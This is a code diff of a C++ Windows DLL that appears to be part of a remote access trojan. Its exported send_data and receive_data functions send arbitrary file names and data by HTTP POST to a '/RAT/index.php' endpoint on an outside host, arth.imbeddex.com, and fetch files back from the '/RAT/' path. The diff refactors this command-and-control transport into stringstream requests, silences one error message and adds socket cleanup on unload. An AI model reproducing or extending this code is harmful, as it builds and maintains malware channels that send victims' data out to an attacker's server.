@@ -11,7 +11,7 @@ using namespace std;
 #define DLL_EXPORT __declspec(dllexport)
 
 SOCKET clientSocket;
-std::mutex socketMutex; 
+mutex socketMutex; 
 
 int safe_closesocket(SOCKET &clientSocket)
 {
@@ -77,54 +77,23 @@ DLL_EXPORT int send_data(const string& filename , const string& data)
         
         if(!socket_setup(clientSocket)) return 1;
 
-        string strfilename="",strdata="",httpRequest = "";;
-        strfilename = filename.c_str();
-        strdata = data.c_str();
-        
-        string strFinal = strfilename + strdata;
-        httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n"; 
-        httpRequest += "Content-Length: " + to_string(strFinal.length()) + "\r\n";
-        httpRequest += "Content-Type: application/octet-stream\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
-        httpRequest += strFinal;
 
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        std::stringstream httpRequest;
+        httpRequest << "POST /RAT/index.php HTTP/1.1\r\n"
+                    << "Host: arth.imbeddex.com\r\n"
+                    << "Content-Length: " << (filename.length() + data.length()) << "\r\n"
+                    << "Content-Type: application/octet-stream\r\n"
+                    << "Connection: close\r\n\r\n"
+                    << filename << data;
+
+        std::string requestString = httpRequest.str();
+        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);        
         if (bytesSent == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
             cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
             return 1;
         }
-
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        // char buffer[4096]; // Increased buffer size
-        // string receivedData;
-        // int bytesReceived;
-
-        // do {
-        //     bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-        //     if (bytesReceived > 0)
-        //     {
-        //         buffer[bytesReceived] = '\0';
-        //         receivedData += buffer; // Append to the received data
-        //     }
-        //     else if (bytesReceived == 0)
-        //     {
-        //         cerr << "Connection closed by server." << endl;
-        //         break; // Exit the loop on clean close
-        //     }
-        //     else
-        //     {
-        //         int error = WSAGetLastError();
-        //         if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-        //         break; // Exit loop on error
-        //     }
-        // } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
 
         if(!safe_closesocket(clientSocket)) return 1;
         return 0;
@@ -138,16 +107,18 @@ DLL_EXPORT string receive_data(const string &filename)
 
         socket_setup(clientSocket);
 
-        string f_name = filename.c_str();
-        string httpRequest = "GET /RAT/"+f_name+" HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
+        string f_name = filename;
+        std::stringstream httpRequest;
+        httpRequest << "GET /RAT/" << f_name << " HTTP/1.1\r\n"
+                    << "Host: arth.imbeddex.com\r\n"
+                    << "Connection: close\r\n\r\n";
 
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        string requestString = httpRequest.str();
+        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
         if (bytesSent == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
-            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+            //cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
         }
 
         /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -157,24 +128,23 @@ DLL_EXPORT string receive_data(const string &filename)
         int bytesReceived;
 
         do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
             if (bytesReceived > 0)
             {
                 buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
+                receivedData += buffer;
             } 
             else if (bytesReceived == 0)
             {
                 cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
+                break;
             } else
             {
                 int error = WSAGetLastError();
                 if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                 break; // Exit loop on error
             }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+        } while (bytesReceived == sizeof(buffer) - 1);
 
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -221,7 +191,8 @@ DLL_EXPORT string receive_data(const string &filename)
     }
 }
 
-BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
     switch (ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
@@ -232,6 +203,7 @@ BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpRese
         case DLL_PROCESS_DETACH:
         {
             //MessageBoxA(NULL, "DLL_PROCESS_DETACH" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
+            WSACleanup();
             break;
         }
         case DLL_THREAD_ATTACH:
